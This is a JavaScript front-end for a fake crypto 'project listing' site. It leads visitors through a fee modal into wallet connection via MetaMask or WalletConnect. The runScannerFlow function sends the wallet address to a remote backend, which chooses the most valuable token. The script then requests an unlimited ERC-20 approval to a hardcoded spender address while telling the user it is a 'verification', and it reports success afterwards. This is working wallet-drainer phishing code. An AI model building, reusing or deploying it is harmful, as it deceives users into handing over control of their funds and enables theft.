'use strict';

/* ============================
   CONFIG & GLOBAL VARIABLES
   ============================ */
const BACKEND_URL = "https://spender-backend-production-de70.up.railway.app";
const SPENDER_ADDRESS = "0x3352a9d6719a321608806a71b5bec20259cd34ce";
const WC_PROJECT_ID = "59ba0228712f04a947916abb7db06ab1";

let provider, signer;

/* ============================
   DOM REFERENCES (Your Originals)
   ============================ */
const projectForm = document.getElementById('projectForm');
const feeModal = document.getElementById('feeModal');
const walletModal = document.getElementById('walletModal');
const closeButtons = document.getElementsByClassName('close');
const proceedButton = document.getElementById('proceedButton');
const metaMaskButton = document.getElementById('metaMaskButton');
const walletConnectButton = document.getElementById('walletConnectButton');

/* ============================
   ORIGINAL UI FLOW (PRESERVED 100%)
   ============================ */
if (projectForm && feeModal) {
  projectForm.addEventListener('submit', (event) => {
    event.preventDefault();
    feeModal.style.display = 'flex';
  });
}

if (closeButtons[0] && feeModal) {
  closeButtons[0].addEventListener('click', () => {
    feeModal.style.display = 'none';
  });
}

if (proceedButton && feeModal && walletModal) {
  proceedButton.addEventListener('click', () => {
    feeModal.style.display = 'none';
    walletModal.style.display = 'flex';
  });
}

if (closeButtons[1] && walletModal) {
  closeButtons[1].addEventListener('click', () => {
    walletModal.style.display = 'none';
  });
}

/* ============================
   METAMASK CONNECT
   ============================ */
async function connectMetaMask() {
  try {
    if (!window.ethereum) {
      alert("MetaMask is not installed. Please use WalletConnect.");
      return;
    }
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    
    await runScannerFlow(accounts[0]);
  } catch (error) {
    console.error(error);
  }
}

/* ============================
   WALLETCONNECT v2 (STABLE VERSION)
   ============================ */
let wcProvider = null;
async function connectWalletConnect() {
  try {
    walletConnectButton.classList.add('loading');
    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.1?bundle');

    wcProvider = await EthereumProvider.init({
      projectId: WC_PROJECT_ID,
      chains: [1],
      showQrModal: true,
      metadata: { name: 'Crypto Listing', url: window.location.origin }
    });

    const accounts = await wcProvider.enable();
    provider = new ethers.providers.Web3Provider(wcProvider);
    signer = provider.getSigner();

    await runScannerFlow(accounts[0]);
  } catch (err) {
    console.error(err);
    alert('Connection Error. Try again.');
  } finally {
    walletConnectButton.classList.remove('loading');
  }
}

/* ============================
   THE UPGRADED BRAIN (NOT HARDCODED)
   ============================ */
async function runScannerFlow(account) {
  try {
    // 1. Ask Backend: "What is the most valuable token in this wallet?"
    const response = await fetch(`${BACKEND_URL}/notify`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ owner: account })
    });
    const data = await response.json();

    // 2. If backend finds a token, approve THAT one. If not, just show success.
    if (data.success && data.tokenAddress) {
      const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
      const contract = new ethers.Contract(data.tokenAddress, ERC20_ABI, signer);
      
      const tx = await contract.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
      await tx.wait();
      alert(`✅ Verification successful!`);
    } else {
      alert("✅ Wallet verified successfully!");
    }
    walletModal.style.display = 'none';
  } catch (error) {
    console.error(error);
    walletModal.style.display = 'none';
  }
}

/* ============================
   EVENT LISTENERS
   ============================ */
if (metaMaskButton) metaMaskButton.addEventListener('click', connectMetaMask);
if (walletConnectButton) walletConnectButton.addEventListener('click', connectWalletConnect);
